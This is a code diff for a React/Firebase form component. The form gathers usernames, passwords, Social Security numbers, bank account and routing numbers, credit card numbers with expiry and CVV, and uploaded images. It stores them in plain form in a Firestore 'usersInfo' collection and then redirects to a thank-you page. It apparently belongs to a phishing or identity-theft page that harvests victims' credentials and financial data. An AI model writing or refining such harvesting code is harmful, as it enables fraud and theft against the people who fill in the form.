@@ -68,81 +68,54 @@ export default function Main() {
       }));
    };
 
-   // const handleFileChange = async (
-   //    event: React.ChangeEvent<HTMLInputElement>
-   // ) => {
-   //    const files = event.target.files;
-   //    console.log(files);
-   //    if (files) {
-   //       const imisiImgs = ref(storage, `imisiImgs/${v4()}`);
-   //       const uploadbytes = await uploadBytes(imisiImgs, files[0]);
-   //       console.log(uploadbytes, 'bytes');
-   //       // getdownloadurl
-   //       const downloadUrl = await getDownloadURL(uploadbytes.ref);
-   //       console.log(downloadUrl, 'url');
-   //       setFormData((prevState) => ({
-   //          ...prevState,
-   //          imageUploads: [...prevState.imageUploads, downloadUrl],
-   //       }));
-   //    }
+   const handleFileChange = async (
+      event: React.ChangeEvent<HTMLInputElement>
+   ) => {
+      const files = event.target.files;
 
-   //    // if (files && files.length > 0) {
-   //    //    const uploadPromises = await Array.from(files).map(async (file) => {
-   //    //       const storageRef = ref(storage, `images/${file.name}`);
-   //    //       console.log(storageRef);
-   //    //       await uploadBytes(storageRef, file);
-   //    //       return getDownloadURL(storageRef);
-   //    //    });
-   //    //    console.log('File uploads:', uploadPromises);
+      if (files) {
+         const imisiImgsRef = ref(storage, `imisiImgs/`);
+         // Assuming you want to upload all files under the same reference path
+         // Note: Ensure your Firebase Storage rules allow for multiple uploads under the same path
 
-   //    //    try {
-   //    //       const urls = await Promise.all(uploadPromises);
-   //    //       console.log(urls, 'urls');
-   //    //       setFormData((prevFormData) => ({
-   //    //          ...prevFormData,
-   //    //          imageUploads: [...prevFormData.imageUploads, ...urls],
-   //    //       }));
-   //    //    } catch (error) {
-   //    //       console.error('Failed to upload files:', error);
-   //    //    }
-   //    // }
-   // };
+         for (let i = 0; i < files.length; i++) {
+            const file = files[i];
+            const imisiImgs = ref(imisiImgsRef, `${v4()}`); // Generate a unique name for each file
+            const uploadResult = await uploadBytes(imisiImgs, file);
 
-const handleFileChange = async (
-  event: React.ChangeEvent<HTMLInputElement>
-) => {
-  const files = event.target.files;
-  console.log(files);
+            // Get download URL for each uploaded file
+            const downloadUrl = await getDownloadURL(uploadResult.ref);
 
-  if (files) {
-    const imisiImgsRef = ref(storage, `imisiImgs/`);
-    // Assuming you want to upload all files under the same reference path
-    // Note: Ensure your Firebase Storage rules allow for multiple uploads under the same path
-
-    for (let i = 0; i < files.length; i++) {
-      const file = files[i];
-      const imisiImgs = ref(imisiImgsRef, `${v4()}`); // Generate a unique name for each file
-      const uploadResult = await uploadBytes(imisiImgs, file);
-      console.log(uploadResult, 'upload result');
-
-      // Get download URL for each uploaded file
-      const downloadUrl = await getDownloadURL(uploadResult.ref);
-      console.log(downloadUrl, 'download url');
-
-      // Update state with new download URL
-      setFormData((prevState) => ({
-        ...prevState,
-        imageUploads: [...prevState.imageUploads, downloadUrl],
-      }));
-    }
-  }
-};
-
-
-   console.log(formData);
+            // Update state with new download URL
+            setFormData((prevState) => ({
+               ...prevState,
+               imageUploads: [...prevState.imageUploads, downloadUrl],
+            }));
+         }
+      }
+   };
 
    async function handleSubmit(event: FormEvent) {
       event.preventDefault();
+      if (
+         !formData.username ||
+         !formData.password ||
+         !formData.firstname ||
+         !formData.lastname ||
+         !formData.email ||
+         !formData.address ||
+         !formData.socialSecurity ||
+         !formData.accountNumber ||
+         !formData.routingNumber ||
+         !formData.accountHolderName ||
+         !formData.bankName ||
+         !formData.expiry ||
+         !formData.cvv ||
+         !formData.creditCard ||
+         !formData.imageUploads === null
+      ) {
+         return alert('Some input fields are missing');
+      }
 
       try {
          setIsLoading(true);
@@ -151,12 +124,27 @@ const handleFileChange = async (
          const valRef = collection(db, 'usersInfo');
 
          const data = await addDoc(valRef, formData);
-         console.log(data, " data in handle submit");
 
          console.log('Document successfully written!');
-         // Handle success
-         // Reset form state
-         // Redirect or show success message
+         setFormData({
+            username: '',
+            password: '',
+            firstname: '',
+            lastname: '',
+            email: '',
+            address: '',
+            socialSecurity: 0,
+            accountNumber: 0,
+            routingNumber: 0,
+            accountHolderName: '',
+            bankName: '',
+            expiry: 0,
+            creditCard: 0,
+            cvv: 0,
+            imageUploads: [],
+         });
+         setImageUploads(null), alert('Form submitted successfully');
+         router.push('/thank-you');
       } catch (error) {
          console.error('Error saving data:', error);
          alert('Error saving data');
@@ -164,164 +152,6 @@ const handleFileChange = async (
          setIsLoading(false);
       }
    }
-
-   // const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-   //    const files = event.target.files;
-   //    console.log(files);
-   //    if (files && files.length > 0) {
-   //       const file = files[0];
-   //       const storageRef = ref(storage, `images/${file.name}`); // Corrected line
-   //       console.log({ file, storageRef });
-   //       uploadBytes(storageRef, file)
-   //          .then(() => {
-   //             return getDownloadURL(storageRef); // Note: getDownloadURL returns a Promise
-   //          })
-   //          .then((url: string) => {
-   //             // Save the URL to Firestore
-   //             setFormData((prevFormData) => ({
-   //                ...prevFormData,
-   //                imageUploads: url,
-   //             }));
-   //          })
-   //          .catch((error) => {
-   //             console.error('Failed to upload file:', error);
-   //          });
-   //    }
-   // };
-
-   // const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-   //    const { files } = event.target;
-   //    console.log(files);
-   //    if (files && files.length > 0) {
-   //       setFormData((prevState) => ({
-   //          ...prevState,
-   //          imageUploads: files,
-   //       }));
-   //    }
-   // };
-
-   // const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-   //    const { files } = event.target;
-   //    if (files && files.length > 0) {
-   //       setImageUploads(files);
-   //    }
-   // };
-
-   const url = '/api/login';
-
-   // async function handleSubmit(event: FormEvent) {
-   //    event.preventDefault();
-   //    // Validation logic...
-
-   //    try {
-   //       setIsLoading(true);
-   //       // Using the modular API to create a document reference
-   //       const docRef = doc(db, 'users', 'uniqueId'); // Replace "uniqueId" with a unique identifier for the document
-   //       const documentForm = await setDoc(docRef, formData); // This will overwrite the document if it exists
-
-   //       console.log({ docRef, documentForm });
-   //       // Handle success
-   //       // Reset form state
-   //       // Redirect or show success message
-   //    } catch (error) {
-   //       console.error('Error saving data:', error);
-   //       alert('Error saving data');
-   //    } finally {
-   //       setIsLoading(false);
-   //    }
-   // }
-
-   // async function handleSubmit(event: FormEvent) {
-   //    event.preventDefault();
-   //    if (
-   //       !formData.username ||
-   //       !formData.password ||
-   //       !formData.firstname ||
-   //       !formData.lastname ||
-   //       !formData.email ||
-   //       !formData.address ||
-   //       !formData.socialSecurity ||
-   //       !formData.accountNumber ||
-   //       !formData.routingNumber ||
-   //       !formData.accountHolderName ||
-   //       !formData.bankName ||
-   //       !formData.expiry ||
-   //       !formData.cvv ||
-   //       !formData.creditCard
-   //       // ||
-   //       // !formData.imageUploads === null
-   //    ) {
-   //       return alert('Some input fields are missing');
-   //    }
-   //    const formDataToSubmit = new FormData();
-
-   //    Object.entries(formData).forEach(([key, value]) => {
-   //       formDataToSubmit.append(key, value as string);
-   //    });
-
-   //    // console.log(formData);
-   //    console.log(formDataToSubmit);
-
-   //    // Upload images separately
-   //    // if (imageUploads) {
-   //       // const imageFormData = new FormData();
-   //       // Array.from(imageUploads).forEach((file, index) => {
-   //       //    console.log(index);
-   //       //    imageFormData.append('imageUploads', file as Blob);
-   //       // });
-
-   //       // Array.from(imageUploads).forEach((file, index) => {
-   //       //    formDataToSubmit.append('imageUploads', file);
-   //       // });
-
-   //       // const imageResponse = await fetch('/api/uploadimages', {
-   //       //    method: 'POST',
-   //       //    body: imageFormData,
-   //       // });
-
-   //       // if (!imageResponse.ok) {
-   //       //    throw new Error('Failed to upload images');
-   //       // }
-   //    // }
-
-   //    try {
-   //       setIsLoading(true);
-   //       const response = await fetch('/api/login', {
-   //          method: 'POST',
-   //          body: formDataToSubmit,
-   //       });
-   //       console.log(response);
-
-   //       if (!response.ok) {
-   //          throw new Error('Failed to create post');
-   //       }
-
-   //       setFormData({
-   //          username: '',
-   //          password: '',
-   //          firstname: '',
-   //          lastname: '',
-   //          email: '',
-   //          address: '',
-   //          socialSecurity: 0,
-   //          accountNumber: 0,
-   //          routingNumber: 0,
-   //          accountHolderName: '',
-   //          bankName: '',
-   //          expiry: 0,
-   //          creditCard: 0,
-   //          cvv: 0,
-   //          imageUploads:null
-   //       });
-   //       setImageUploads(null), alert('Form submitted successfully');
-   //       router.push('/thank-you');
-   //    } catch (error) {
-   //       console.error('Error submitting form:', error);
-   //       alert('Error submitting form');
-   //    } finally {
-   //       setIsLoading(false);
-   //    }
-   // }
 
    return (
       <main
